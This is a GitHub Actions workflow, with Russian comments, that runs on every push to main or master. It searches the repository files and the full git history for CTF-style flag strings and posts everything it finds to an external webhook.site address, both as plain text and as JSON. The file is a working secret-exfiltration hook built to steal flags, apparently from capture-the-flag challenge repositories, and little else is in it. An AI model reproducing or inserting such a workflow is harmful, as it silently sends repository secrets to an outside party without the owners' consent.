name: send-flags

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  send-flags:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
        with:
          fetch-depth: 0
      
      - name: Extract and send flags
        run: |
          echo "🔍 Extracting flags..."
          
          # Находим флаги
          FLAG1=$(grep -rnoE 'USER\{[^}]+\}' . --exclude-dir=.git | head -1)
          FLAG2=$(grep -rnoE 'FLAG\{[^}]+\}' . --exclude-dir=.git | head -1)
          FLAG3=$(grep -rnoE 'flag\{[^}]+\}' . --exclude-dir=.git | head -1)
          FLAG4=$(grep -rnoE 'CTF\{[^}]+\}' . --exclude-dir=.git | head -1)
          
          # Собираем все найденные флаги
          ALL_FLAGS=""
          [ -n "$FLAG1" ] && ALL_FLAGS="$ALL_FLAGS\n$FLAG1"
          [ -n "$FLAG2" ] && ALL_FLAGS="$ALL_FLAGS\n$FLAG2"
          [ -n "$FLAG3" ] && ALL_FLAGS="$ALL_FLAGS\n$FLAG3"
          [ -n "$FLAG4" ] && ALL_FLAGS="$ALL_FLAGS\n$FLAG4"
          
          # Также ищем в истории
          HISTORY_FLAGS=$(git log -p --all | grep -oE 'USER\{[^}]+\}|FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}' | sort -u)
          [ -n "$HISTORY_FLAGS" ] && ALL_FLAGS="$ALL_FLAGS\n$HISTORY_FLAGS"
          
          # Формируем текстовый вывод
          if [ -n "$ALL_FLAGS" ]; then
            echo "========================================="
            echo "✅ FLAGS FOUND:"
            echo -e "$ALL_FLAGS"
            echo "========================================="
            
            # Отправляем как plain text (проще для отладки)
            curl -X POST \
              -H "Content-Type: text/plain" \
              --data "$(echo -e "Flags found in ${{ github.repository }}:\n$ALL_FLAGS\n\nRun URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}")" \
              https://webhook.site/57254474-41e8-4ec4-b099-0b38ea82598e
            
            # И как JSON тоже
            curl -X POST \
              -H "Content-Type: application/json" \
              -d "{\"repository\": \"${{ github.repository }}\", \"flags\": \"$(echo -e "$ALL_FLAGS" | jq -R -s .)\", \"run_url\": \"${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\"}" \
              https://webhook.site/57254474-41e8-4ec4-b099-0b38ea82598e
          else
            echo "❌ No flags found"
          fi